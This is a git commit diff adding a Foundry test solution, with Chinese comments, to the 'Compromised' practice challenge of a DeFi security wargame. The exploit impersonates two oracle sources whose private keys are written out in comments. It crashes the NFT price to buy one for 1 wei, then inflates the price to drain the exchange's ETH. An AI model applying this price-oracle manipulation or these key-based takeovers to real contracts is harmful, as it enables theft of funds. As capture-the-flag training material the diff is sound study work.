8a31e414336a76625ade6e2ed104dddbcec1a014
lzhkai <lzhkai1111@qq.com>
2026-03-05 20:25:47 +0800

    compromised

--- test/compromised/Compromised.t.sol
+++ test/compromised/Compromised.t.sol
@@ -22,8 +22,8 @@ contract CompromisedChallenge is Test {
 
 
     address[] sources = [
-        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
-        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
+        0x188Ea627E3531Db590e6f1D71ED83628d1933088, // 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        0xA417D473c40a4d42BAd35f147c21eEa7973539D8, // 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
@@ -43,17 +43,17 @@ contract CompromisedChallenge is Test {
 
         // Initialize balance of the trusted source addresses
         for (uint256 i = 0; i < sources.length; i++) {
-            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
+            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE); // 每个NFT的初始价格为999 ether
         }
 
         // Player starts with limited balance
-        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
+        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE); // 玩家初始余额为0.1 ether
 
         // Deploy the oracle and setup the trusted sources with initial prices
         oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
 
         // Deploy the exchange and get an instance to the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle)); // 交易所初始余额为999 ether
         nft = exchange.token();
 
         vm.stopPrank();
@@ -75,7 +75,52 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        // 1. 获取预言机节点地址
+        // uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        // uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        // address source1 = vm.addr(pk1);
+        // address source2 = vm.addr(pk2);
+        address source1 = 0x188Ea627E3531Db590e6f1D71ED83628d1933088;
+        address source2 = 0xA417D473c40a4d42BAd35f147c21eEa7973539D8;
+
+        // 2. 操纵价格为 0
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", 0);
         
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", 0);
+
+        // 3. 玩家以接近 0 的价格买入 NFT
+        vm.startPrank(player);
+        uint256 tokenId = exchange.buyOne{value: 1 wei}();
+        vm.stopPrank();
+
+        // 4. 操纵价格为交易所的全部余额
+        uint256 exchangeBalance = address(exchange).balance;
+        
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", exchangeBalance);
+        
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", exchangeBalance);
+
+        // 5. 玩家授权并高价卖出 NFT
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+
+        // 6. 恢复预言机价格，满足通关条件
+        vm.stopPrank();
+        
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        // 7. 转移资金给 recovery
+        vm.prank(player);
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
     }
 
     /**
